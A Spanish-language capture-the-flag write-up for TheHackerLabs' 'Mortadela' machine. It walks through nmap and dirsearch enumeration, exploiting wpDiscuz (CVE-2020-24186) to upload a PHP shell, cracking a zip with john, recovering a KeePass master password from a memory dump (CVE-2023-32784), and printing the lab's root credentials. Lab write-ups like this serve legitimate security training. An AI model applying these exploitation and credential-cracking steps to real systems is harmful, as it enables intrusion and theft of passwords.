---
title: "Mortadela - WriteUp"
date: Fri Aug 23 2024 11:28:12 GMT+0200 (Central European Summer Time)
categories: [WriteUps, TheHackerLabs, Linux]
tags: [wordpress, CVE-2020-24186, CVE-2023-32784, dotnet, keepass-password-dumper]
image: /assets/img/cabeceras/2024-08-23-mortadela---writeup.jpg
---

## Enumeración

NMAP

```bash
# Nmap 7.94SVN scan initiated Fri Apr  5 09:59:23 2024 as: nmap -sCV -p 22,80,3306 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 192.168.1.44
Nmap scan report for 192.168.1.44
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA)
|_  256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 33
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, FoundRows, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: yi~aH%{bWnCA^76IK}Sf
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:0E:4B:CF (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

FUZZ 

Descubrimos que corre un Wordpress:
```bash
$ dirsearch -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405113824.png)

Hacemos un escaneo de plugins con NMAP y descubrimos dos, pero uno nos llama la atneción:

```bash
$ nmap -p80 192.168.0.108 --script http-wordpress-enum --script-args http-wordpress-enum.root='/wordpress/',search-limit=1000
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114001.png)


## Explotación

Buscamos vulnerabilidades y encontramos dos que se adaptan perfectamente a la versión:

```bash
$ se wpdiscuz
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114143.png)

Probamos el exploit encontrado por `searchsploit` pero no nos convence. Vamos a buscar por la web.

Encontramos este [CVE-2020-24186](https://github.com/meicookies/CVE-2020-24186) y nos funciona perfectamente. Creamos el archivo con la URL y ejecutamos el plugin.

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114418.png)

```bash
$ ./CVE-2020-24186 site.txt
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114501.png)

Vemos que es vulnerable y nos ha subido un archivo PHP con el que poder subir archivos.

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114541.png)

Vamos a probar de subir un shell remoto. El por defecto en estos casos.

Nos ponemos a la espera, subimos el archivo PHP con la web que hemos creado y pa dentro!

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405114917.png)

Sanitizamos consola y empezamos a enumerar:

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405115151.png)

Encontramos un archivo sospechoso en /opt...

Nos lo bajamos a nuestro equipo y vemos que tiene contraseña. Le pasamos john...

```bash
$ zip2john muyconfidencial.zip > confidencial.hash
...
$ john --wordlist=/usr/share/wordlists/rockyou.txt confidencial.hash
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405120859.png)

Contraseña de descompresión: _pinkgirl_

Descomprimimos y mostramos el contenido:

Contiene dos archivos, un dumpeo de keepass y otro que es la BBDD de Keepass:

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405121117.png)

Buscamos info y encontramos el repositorio [KeePass Password Dumper](https://github.com/vdohney/keepass-password-dumper)

Debemos emular un proyecto hecho en C# y pasarle el DUMP del Keepass. Con este programa llamado _dotnet_ creamos una lista de posibles contraseñas para romper la seguridad de la base de datos del Keepass.

Instalamos [DOTNET LINUX](https://learn.microsoft.com/en-us/dotnet/core/install/linux-scripted-manual#manual-install) para Linux.

Nos clonamos el repositorio arriba mencionado y ejecutamos lo siguiente:

```bash
$ dotnet run ../KeePass.DMP passwordlist 
```

---

## Notas

Si recibimos el error del tipo:

_"/usr/share/dotnet/sdk/6.0.400/Sdks/Microsoft.NET.Sdk/targets/Microsoft.NET.TargetFrameworkInference.targets(144,5): error NETSDK1045: The current .NET SDK does not support targeting .NET 7.0.  Either target .NET 6.0 or lower, or use a version of the .NET SDK that supports .NET 7.0."_

Simplemente editamos el archivo _.csproj_ y en la línea con la etiqueta < TargetFramework > indicamos la versión que tengamos, en mi caso tuve que poner la `net6.0`

---

Recibiremos la siguiente salida:

```bash
Found: ●9
Found: ●;
Found: ●H
Found: ●[
Found: ● 
Found: ●f

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:	●
2.:	a, Ï, §, ñ, D, , \, #, y, k, 9, ;, H, [,  , f, 
3.:	r, 
4.:	i, 
5.:	t, 
6.:	r, 
7.:	i, 
8.:	n, 
9.:	i, 
10.:	1, 
11.:	2, 
12.:	3, 
13.:	4, 
14.:	5, 
Combined: ●{a, Ï, §, ñ, D, , \, #, y, k, 9, ;, H, [,  , f}ritrini12345
16 possible passwords saved in passwordlist. Unknown characters indicated as ●
```

Casi casi tenemos el password. Ahora con con _john_ y _hashcat_ terminaremos la faena:


## Escalada

Obtenemos el hash de la BBDD de Keepass (archivo Database.kdbx):

```bash
$ keepass2john Database.kdbx > database.hash
```

Y por último pasamos _hashcat_ :

```bash
$ hashcat -m 13400 --username database.hash passwordlist
```

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405124929.png)

Aunque nos haya dado "Exhausted" y nos falte el primer carácter del password podemos intuir cuáles son los candidatos a password final:

```http
Maritrini12345
maritrini12345
```

Abrimos el archivo .kdbx con Keepass o en mi caso ya que trabajo en Linux con _KeePassXC_ y en contraseña probamos la primera con la M mayúscula y bingo! Entramos en la BBDD!

Y nos muestra con gran afecto el password de root!

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405125330.png)

Credenciales:

```http
root:Juanikonokukunero
```

Las probamos en nuestra consola y...

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405125511.png)

Enhorabuena! somos root y podemos registrar las flags!

![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405130451.png)



![image](/assets/img/2024-08-23-mortadela---writeup/pasted-image-20240405130041.png)

